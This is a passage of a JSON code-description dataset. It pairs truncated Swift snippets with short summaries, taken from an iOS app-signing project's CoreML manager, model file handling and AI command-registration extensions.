    "code": "private func processOutputs(prediction: MLFeatureProvider, text: String) throws -> PredictionResult {\n// Default values\nvar intent = \"unknown\"\nvar confidence = 0.0\nvar parameters: [String: Any] = [:]\nvar probabilities: [String: Double] = [:]\n\n// Try to extract output features from the prediction\nfor featureName in prediction.featureNames {",
    "nl": "/ Process model outputs into a structured result",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1770",
    "code": "private func extractParameters(from text: String, intent: String) -> [String: Any] {\nvar parameters: [String: Any] = [:]\n\n// Use regex to extract structured data from the text\nswitch intent.lowercased() {",
    "nl": "/ Extract parameters from text based on the predicted intent",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1771",
    "code": "private func extractCommonParameters(from text: String, into parameters: inout [String: Any]) {\n// Look for app names\nif let appName = text.extractMatch(\npattern: \"(?i)\\\\b(?:app|application)\\\\s+(?:called|named)\\\\s+\\\"?([^\\\".,?!]+)\\\"?\",\ngroupIndex: 1\n) {",
    "nl": "/ Extract common parameters from any text",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1772",
    "code": "private func performSentimentAnalysisLegacy(\ntext: String,\ncompletion: @escaping (Result<SentimentResult, PredictionError>) -> Void\n) {",
    "nl": "/ Performs sentiment analysis on text (private implementation)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1773",
    "code": "private func setupMemoryPressureMonitoring() {\n// Create a local copy of the observer to avoid mutation after capture\nvar memoryObserverLocal: NSObjectProtocol?\n\n// Create the observer before the closure to avoid capturing it in the closure\nlet memoryObserver = NotificationCenter.default.addObserver(\nforName: UIApplication.didReceiveMemoryWarningNotification,\nobject: nil,\nqueue: .main\n) { [weak self] _ in",
    "nl": "/ Set up memory pressure monitoring",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1774",
    "code": "struct PredictionResult {\nlet intent: String\nlet confidence: Double\nlet text: String\nlet parameters: [String: Any]\nlet probabilities: [String: Double]\n}\n\n/// Result of sentiment analysis\nstruct SentimentResult {",
    "nl": "Import the extension containing extractMatch from AppContextManager+AIIntegration.swift Note: The extractMatch method is defined elsewhere in the project We avoid redeclaration by using that implementation instead MARK: - Models / Result of intent prediction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1775",
    "code": "struct SentimentResult {\nlet sentiment: SentimentType\nlet score: Double\nlet text: String\n}\n\n/// Types of sentiment\nenum SentimentType: String {",
    "nl": "/ Result of sentiment analysis",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1776",
    "code": "enum SentimentType: String {\ncase positive\ncase negative\ncase neutral\n}\n\n/// Errors that can occur during prediction\nenum PredictionError: Error, LocalizedError {",
    "nl": "/ Types of sentiment",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "enum"
  },
  {
    "id": "1777",
    "code": "enum PredictionError: Error, LocalizedError {\ncase modelNotLoaded\ncase modelNotFound\ncase invalidModelFormat\ncase unsupportedInputType\ncase unsupportedOperation\ncase predictionFailed(Error)\n\nvar errorDescription: String? {",
    "nl": "/ Errors that can occur during prediction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "enum"
  },
  {
    "id": "1778",
    "code": "final class ModelFileManager {\nstatic let shared = ModelFileManager()\n\nprivate init() {}",
    "nl": "/ Manages ML model file operations and ensures it's available for the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift",
    "code_type": "class"
  },
  {
    "id": "1779",
    "code": "private func getModelDirectory() -> URL? {\ndo {",
    "nl": "/ Get or set up the models directory in the Documents folder",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "1780",
    "code": "func findUserGeneratedModel() -> URL? {\nDebug.shared.log(message: \"Looking for user-generated models\", type: .info)\n\nguard let modelsDir = getModelDirectory() else {",
    "nl": "/ Check for user-generated models in the documents directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "1781",
    "code": "func createModelURL(versionSuffix: String? = nil) -> URL? {\nguard let modelsDir = getModelDirectory() else {",
    "nl": "/ Create a URL for a new model file with timestamp",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "1782",
    "code": "func setupModelDirectories() {\n// Just ensure the directories exist\n_ = getModelDirectory()\n\n// Create a legacy directory for backward compatibility\ndo {",
    "nl": "/ Setup the initial model directory structure",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "1783",
    "code": "func copyModelToDocuments(from sourceURL: URL, versionSuffix: String? = nil) -> URL? {\nguard let destinationURL = createModelURL(versionSuffix: versionSuffix) else {",
    "nl": "/ Copy a model file to the models directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "1784",
    "code": "func prepareMLModel(completion: @escaping (Result<URL?, Error>) -> Void) {\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Prepare the model system - now focused on user-generated models",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "1785",
    "code": "enum ModelError: Error, LocalizedError {\ncase modelNotFound\ncase copyFailed\ncase directoryCreationFailed\ncase insufficientTrainingData\n\nvar errorDescription: String? {",
    "nl": "/ Errors that can occur during model file operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift",
    "code_type": "enum"
  },
  {
    "id": "1786",
    "code": "extension AppContextManager {\n/// Initialize AI integration - call this at app startup\nfunc setupAIIntegration() {",
    "nl": "MARK: - AI Integration Extension for AppContextManager",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "extension"
  },
  {
    "id": "1787",
    "code": "func setupAIIntegration() {\n// Register all available commands\nregisterAllCommands()\n\n// Setup observers for context updates\nsetupContextObservers()\n\n// Setup CoreML integration\nsetupCoreML()\n",
    "nl": "/ Initialize AI integration - call this at app startup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1788",
    "code": "@objc private func coreMLModelLoaded() {\nDebug.shared.log(message: \"CoreML model load completed, enhancing AI capabilities\", type: .info)\n\n// Update any AI components that depend on the model\nlet additionalData: [String: Any] = [\n\"mlModelLoaded\": true,\n\"mlCapabilities\": [\"intent recognition\", \"sentiment analysis\", \"parameter extraction\"],\n]\nsetAdditionalContextData(additionalData)\n",
    "nl": "/ Handle CoreML model load completion",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1789",
    "code": "private func setupContextObservers() {\n// Observe tab changes\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleTabChange(_:)),\nname: Notification.Name(\"changeTab\"),\nobject: nil\n)\n\n// Observe app state changes",
    "nl": "/ Setup context observation to keep AI updated with app state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1790",
    "code": "@objc private func handleTabChange(_ notification: Notification) {\nif let newTab = notification.userInfo?[\"tab\"] as? String {",
    "nl": "Function handleTabChange - implements handletabchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1791",
    "code": "@objc private func appEnteredForeground() {\n// Refresh context when app becomes active\nif let topVC = UIApplication.shared.topMostViewController() {",
    "nl": "Function appEnteredForeground - implements appenteredforeground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1792",
    "code": "@objc private func certificatesUpdated() {\n// Update AI context with new certificate information\nlet certificates = CoreDataManager.shared.getDatedCertificate()\nlet currentCert = CoreDataManager.shared.getCurrentCertificate()\n\nlet additionalData: [String: Any] = [\n\"certificates\": certificates.map { $0.certData?.name ?? \"Unnamed\" },",
    "nl": "Function certificatesUpdated - implements certificatesupdated functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1793",
    "code": "@objc private func libraryUpdated() {\n// Update AI context with library information\nlet downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()\nlet signedApps = CoreDataManager.shared.getDatedSignedApps()\n\nlet additionalData: [String: Any] = [\n\"downloadedApps\": downloadedApps\n.map { AppInfo(name: $0.name ?? \"Unnamed\", version: $0.version ?? \"Unknown\").description },",
    "nl": "Function libraryUpdated - implements libraryupdated functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1794",
    "code": "@objc private func settingsUpdated() {\n// Update AI context with relevant settings changes\nlet additionalData: [String: Any] = [\n\"appTintColor\": Preferences.appTintColor.uiColor.toHexString(),\n\"interfaceStyle\": UIUserInterfaceStyle(rawValue: Preferences.preferredInterfaceStyle)?\n.styleName ?? \"unspecified\",\n\"preferredLanguage\": Preferences.preferredLanguageCode ?? \"system default\",\n]\n\nsetAdditionalContextData(additionalData)",
    "nl": "Function settingsUpdated - sets tingsupdated",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1795",
    "code": "func processUserInput(_ text: String) -> (intent: String, parameter: String, confidence: Float)? {\n// First try the pattern-based intent recognition for high confidence matches\nif let patternMatch = enhanceContextWithNLU(text) {",
    "nl": "/ Process user input through our enhanced natural language understanding",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1796",
    "code": "func enhanceContextWithNLU(_ textInput: String) -> (intent: String, parameter: String)? {\nlet lowercasedInput = textInput.lowercased()\n\n// Check for app signing intent\nif lowercasedInput.matches(pattern: \"(?i)sign\\\\s+(the\\\\s+)?app\\\\s+(?:called\\\\s+|named\\\\s+)?(.+?)\\\\s*$\") {",
    "nl": "/ Enhanced context with natural language understanding capabilities",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1797",
    "code": "extension String {\nfunc matches(pattern: String) -> Bool {",
    "nl": "Helper extensions for string pattern matching",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "extension"
  },
  {
    "id": "1798",
    "code": "func matches(pattern: String) -> Bool {\ndo {",
    "nl": "Function matches - implements matches functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1799",
    "code": "func extractMatch(pattern: String, groupIndex: Int) -> String? {\ndo {",
    "nl": "Function extractMatch - implements extractmatch functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1800",
    "code": "extension UIUserInterfaceStyle {\nvar styleName: String {",
    "nl": "Extension for UIUserInterfaceStyle friendly name",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift",
    "code_type": "extension"
  },
  {
    "id": "1801",
    "code": "extension AppContextManager {\n/// Registers all available commands with the AI assistant\nfunc registerAllCommands() {",
    "nl": "MARK: - Command Registration Extension for AppContextManager",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CommandRegistration.swift",
    "code_type": "extension"
  },
  {
    "id": "1802",
    "code": "func registerAllCommands() {\n// Navigation commands\nregisterCommand(\"navigate to\") { [weak self] screen, completion in",
    "nl": "/ Registers all available commands with the AI assistant",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CommandRegistration.swift",
    "code_type": "function"
  },
  {
    "id": "1803",
    "code": "private func searchApp(_ query: String, completion: @escaping (String) -> Void) {\n// Get downloaded apps\nlet downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()\n\n// Filter apps based on query\nlet matchingApps = downloadedApps.filter { app in",
    "nl": "MARK: - New Command Implementations / Search for apps or content in the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CommandRegistration.swift",
    "code_type": "function"
  },
  {
    "id": "1804",
    "code": "private func explainFeature(_ topic: String, completion: @escaping (String) -> Void) {\nlet lowercasedTopic = topic.lowercased()\n\nif lowercasedTopic.contains(\"sign\") || lowercasedTopic.contains(\"signing\") {",
    "nl": "/ Explain a feature of the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CommandRegistration.swift",
    "code_type": "function"
  },
  {
    "id": "1805",
    "code": "extension AppContextManager {\n/// Initialize CoreML for app-wide use\nfunc setupCoreML() {",
    "nl": "/ Extension to AppContextManager for CoreML setup and integration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CoreMLSetup.swift",
    "code_type": "extension"
  },
  {
    "id": "1806",
    "code": "func setupCoreML() {\nDebug.shared.log(message: \"Setting up CoreML integration\", type: .info)\n\n// Start model loading in background to avoid blocking UI\nDispatchQueue.global(qos: .userInitiated).async {",
    "nl": "/ Initialize CoreML for app-wide use",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CoreMLSetup.swift",
    "code_type": "function"
  },
  {
    "id": "1807",
    "code": "private func prepareAndLoadMLModel() {\n// Ensure model file is available\nModelFileManager.shared.prepareMLModel { result in",
    "nl": "/ Prepare and load the ML model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CoreMLSetup.swift",
    "code_type": "function"
  },
  {
    "id": "1808",
    "code": "private func registerCoreMLCommands() {\n// Command to analyze text with ML model\nregisterCommand(\"analyze text\") { text, completion in",
    "nl": "/ Register commands related to CoreML and AI features",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CoreMLSetup.swift",
    "code_type": "function"
  },
  {
    "id": "1809",
    "code": "extension AppContextManager {\n// MARK: - Navigation\n\n/// Navigate to a specific screen in the app\nfunc navigateToScreen(_ screen: String, completion: @escaping (String) -> Void) {",
    "nl": "MARK: - Command Implementation Extension for AppContextManager",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "extension"
  },
  {
    "id": "1810",
    "code": "func navigateToScreen(_ screen: String, completion: @escaping (String) -> Void) {\n// We don't strictly need to check if we're on the tab bar view\n// Just attempt to navigate and provide appropriate feedback\nguard UIApplication.shared.topMostViewController() != nil else {",
    "nl": "MARK: - Navigation / Navigate to a specific screen in the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1811",
    "code": "func addSource(_ sourceURL: String, completion: @escaping (String) -> Void) {\nguard URL(string: sourceURL) != nil else {",
    "nl": "MARK: - Source Management / Add a source to the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1812",
    "code": "func listSources(completion: @escaping (String) -> Void) {\nlet sources = CoreDataManager.shared.getAZSources()\nif sources.isEmpty {",
    "nl": "/ List all sources in the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1813",
    "code": "func refreshSources(completion: @escaping (String) -> Void) {\nlet backgroundQueue = OperationQueue()\nbackgroundQueue.qualityOfService = .background\nlet operation = SourceRefreshOperation()\n\noperation.completionBlock = {",
    "nl": "/ Refresh all sources",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1814",
    "code": "func downloadApp(_: String, completion: @escaping (String) -> Void) {\n// This is a simplified implementation - would need to be expanded based on app structure\ncompletion(\n\"App download functionality requires user interaction. Please navigate to the Sources tab and select the app you want to download.\"\n)\n}\n\n/// Sign an app\nfunc signApp(_ appName: String, completion: @escaping (String) -> Void) {",
    "nl": "MARK: - App Management / Download an app from a source",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1815",
    "code": "func signApp(_ appName: String, completion: @escaping (String) -> Void) {\nlet downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()\n\nguard !downloadedApps.isEmpty else {",
    "nl": "/ Sign an app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1816",
    "code": "func installApp(_ appName: String, completion: @escaping (String) -> Void) {\nlet signedApps = CoreDataManager.shared.getDatedSignedApps()\n\nguard !signedApps.isEmpty else {",
    "nl": "/ Install a signed app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1817",
    "code": "func listDownloadedApps(completion: @escaping (String) -> Void) {\nlet apps = CoreDataManager.shared.getDatedDownloadedApps()\n\nif apps.isEmpty {",
    "nl": "/ List all downloaded apps",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1818",
    "code": "func listSignedApps(completion: @escaping (String) -> Void) {\nlet apps = CoreDataManager.shared.getDatedSignedApps()\n\nif apps.isEmpty {",
    "nl": "/ List all signed apps",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1819",
    "code": "func deleteApp(_: String, completion: @escaping (String) -> Void) {\n// This is a placeholder - the actual implementation would need to be expanded\ncompletion(\n\"App deletion requires user interaction. Please go to the Library tab, swipe left on the app, and select 'Delete'.\"\n)\n}\n\n// MARK: - Certificate Management\n\n/// List all certificates",
    "nl": "/ Delete an app (downloaded or signed)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1820",
    "code": "func listCertificates(completion: @escaping (String) -> Void) {\nlet certificates = CoreDataManager.shared.getDatedCertificate()\n\nif certificates.isEmpty {",
    "nl": "MARK: - Certificate Management / List all certificates",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1821",
    "code": "func selectCertificate(_ certName: String, completion: @escaping (String) -> Void) {\nlet certificates = CoreDataManager.shared.getDatedCertificate()\n\nguard !certificates.isEmpty else {",
    "nl": "/ Select a certificate for signing",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1822",
    "code": "func importCertificate(completion: @escaping (String) -> Void) {\ncompletion(\n\"Certificate import requires user interaction. Please go to Settings > Certificates > Import Certificate.\"\n)\n}\n\n// MARK: - Settings Management\n\n/// Change app theme\nfunc changeTheme(_ theme: String, completion: @escaping (String) -> Void) {",
    "nl": "/ Import a certificate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1823",
    "code": "func changeTheme(_ theme: String, completion: @escaping (String) -> Void) {\nlet themeMode: Int\nswitch theme.lowercased() {",
    "nl": "MARK: - Settings Management / Change app theme",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1824",
    "code": "func toggleSetting(_ setting: String, completion: @escaping (String) -> Void) {\n// Simple implementation for a few common settings - would need to be expanded\nswitch setting.lowercased() {",
    "nl": "/ Toggle app settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1825",
    "code": "func getAppInfo(_ appName: String, completion: @escaping (String) -> Void) {\n// Check downloaded apps\nlet downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()\nlet matchingDownloaded = downloadedApps.filter {",
    "nl": "/ Get detailed information about an app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1826",
    "code": "func resignApp(_: String, completion: @escaping (String) -> Void) {\n// This is a placeholder - would need to be implemented with access to the app's UI\ncompletion(\n\"App re-signing requires user interaction. Please go to the Library tab, select the app, and choose 'Resign'.\"\n)\n}\n\n/// Add a tweak to an app\nfunc addTweak(_: String, completion: @escaping (String) -> Void) {",
    "nl": "MARK: - Advanced Operations / Resign an app with the current certificate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1827",
    "code": "func addTweak(_: String, completion: @escaping (String) -> Void) {\n// This is a placeholder - would need to be implemented with access to the app's UI\ncompletion(\"Adding tweaks requires user interaction. Please start the signing process and select 'Add Tweaks'.\")\n}\n\n/// Modify an app's bundle ID\nfunc modifyBundleId(_: String, completion: @escaping (String) -> Void) {",
    "nl": "/ Add a tweak to an app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1828",
    "code": "func modifyBundleId(_: String, completion: @escaping (String) -> Void) {\n// This is a placeholder - would need to be implemented with access to the app's UI\ncompletion(\n\"Modifying bundle ID requires user interaction. Please start the signing process and edit the Bundle Identifier field.\"\n)\n}\n\n/// Get current app status\nfunc getAppStatus(completion: @escaping (String) -> Void) {",
    "nl": "/ Modify an app's bundle ID",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1829",
    "code": "func getAppStatus(completion: @escaping (String) -> Void) {\nlet downloadedCount = CoreDataManager.shared.getDatedDownloadedApps().count\nlet signedCount = CoreDataManager.shared.getDatedSignedApps().count\nlet certificateCount = CoreDataManager.shared.getDatedCertificate().count\nlet currentCert = CoreDataManager.shared.getCurrentCertificate()?.certData?.name ?? \"None\"\n\nvar statusInfo = \"Backdoor App Status:\\n\"\nstatusInfo += \"- Downloaded Apps: \\(downloadedCount)\\n\"\nstatusInfo += \"- Signed Apps: \\(signedCount)\\n\"\nstatusInfo += \"- Certificates: \\(certificateCount)\\n\"",
    "nl": "/ Get current app status",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1830",
    "code": "func openApp(_ appName: String, completion: @escaping (String) -> Void) {\nlet signedApps = CoreDataManager.shared.getDatedSignedApps()\n\n// Find the app by name\nlet matchingApps = signedApps.filter {",
    "nl": "/ Open an installed app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1831",
    "code": "func provideHelp(_ topic: String, completion: @escaping (String) -> Void) {\nswitch topic.lowercased() {",
    "nl": "MARK: - Help Functions / Provide help information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift",
    "code_type": "function"
  },
  {
    "id": "1832",
    "code": "extension AppContextManager {\n// MARK: - Enhanced AI Setup\n\n/// Sets up the enhanced AI capabilities\nfunc setupEnhancedAI() {",
    "nl": "/ Enhanced AI integration extension for AppContextManager / / This extension adds improved AI capabilities to the AppContextManager: / 1. Enhanced pattern matching for better command recognition / 2. Context-aware conversations with history tracking / 3. Predictive command suggestions based on user behavior",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "extension"
  },
  {
    "id": "1833",
    "code": "func setupEnhancedAI() {\n// Register for additional context observations\nsetupEnhancedContextObservers()\n\n// Register advanced AI commands\nregisterAdvancedCommands()\n\n// Initialize the learning model\ninitializePredictiveModel()\n",
    "nl": "MARK: - Enhanced AI Setup / Sets up the enhanced AI capabilities",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1834",
    "code": "private func setupEnhancedContextObservers() {\n// Observe file system changes for better context awareness\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(fileSystemChanged(_:)),\nname: NSNotification.Name(\"FileSystemChanged\"),\nobject: nil\n)\n\n// Observe sign operations for better assistance",
    "nl": "Function setupEnhancedContextObservers - sets upenhancedcontextobservers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift",
    "code_type": "function"
  },
  {
    "id": "1835",
    "code": "@objc private func fileSystemChanged(_ notification: Notification) {\nif let changedPath = notification.userInfo?[\"path\"] as? String {",
    "nl": "Function fileSystemChanged - implements filesystemchanged functionality",
